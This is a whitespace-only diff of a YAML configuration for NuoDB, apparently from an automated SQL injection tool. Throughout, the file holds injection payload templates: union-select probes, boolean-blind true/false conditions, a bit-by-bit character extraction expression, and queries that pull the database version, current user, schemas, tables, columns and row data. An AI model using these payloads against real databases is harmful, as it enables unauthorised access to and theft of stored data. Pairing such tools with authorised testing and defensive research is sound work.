@@ -1,25 +1,25 @@
 vendor: NuoDB
 
-resource: 
+resource:
  info: |
   select
-      GETRELEASEVERSION() 
-      || '${enclose_value_sql}' 
-      || database() 
-      || '${enclose_value_sql}' 
-      || current_user() 
+      GETRELEASEVERSION()
+      || '${enclose_value_sql}'
+      || database()
+      || '${enclose_value_sql}'
+      || current_user()
       || '${trail_sql}'
       r
   from dual
-  
- schema: 
+
+ schema:
   database: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -30,14 +30,14 @@ resource:
        ) t
        ${limit}
    ) a
-   
+
   table: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -49,14 +49,14 @@ resource:
        ) t
        ${limit}
    ) a
-   
+
   column: |
-   select 
+   select
        rr
        || '${trail_sql}'
        r
    from (
-       select 
+       select
            '${enclose_value_sql}'
            || t.s
            || '${separator_qte_sql}0${enclose_value_sql}'
@@ -69,36 +69,36 @@ resource:
        ) t
        ${limit}
    ) a
-   
-  row: 
+
+  row:
    query: |
-    select 
+    select
         rr
         || '${trail_sql}'
         r
     from (
-        select 
+        select
             '${enclose_value_sql}'
             || s
             || '${separator_qte_sql}0${enclose_value_sql}'
             rr
         from (
-            select distinct ${fields} s 
+            select distinct ${fields} s
             from ${database}.${table}
         ) t
         ${limit}
     ) a
-   fields: 
+   fields:
     field: ${field.value}
     concat: "|| '%7f' ||"
-    
-strategy: 
- configuration: 
+
+strategy:
+ configuration:
   slidingWindow: |
-   select 
-       '${lead}' 
+   select
+       '${lead}'
        || substr(
-           r, 
+           r,
            ${window.char},
            ${capacity}
        ) r
@@ -108,25 +108,25 @@ strategy:
   calibrator: replicate('${calibrator_sql}', 65536)
   limitBoundary: 0
   endingComment: --+-
-  fingerprint: 
-   errorMessage: 
+  fingerprint:
+   errorMessage:
     - nuodb
-    
- normal: 
+
+ normal:
   indices: union select ${result_range} from (${indice_unique})
   capacity: (select '${lead}${indice}' || ${calibrator} from dual)
   orderBy: order by 1337
-  
- boolean: 
-  test: 
-   falses: 
+
+ boolean:
+  test:
+   falses:
     - true = false
     - true %21= true
     - false %21= false
     - 1 = 2
     - 1 %21= 1
     - 2 %21= 2
-   trues: 
+   trues:
     - true = true
     - false = false
     - true %21= false
@@ -137,11 +137,11 @@ strategy:
    bit: |
     0 != (unicode(
         substr(
-            (${injection}), 
-            ${window.char}, 
+            (${injection}),
+            ${window.char},
             1
         )
-    ) 
+    )
     %26 ${bit})
    length: char_length((${injection})) > ${window.char}
   modeAnd: and
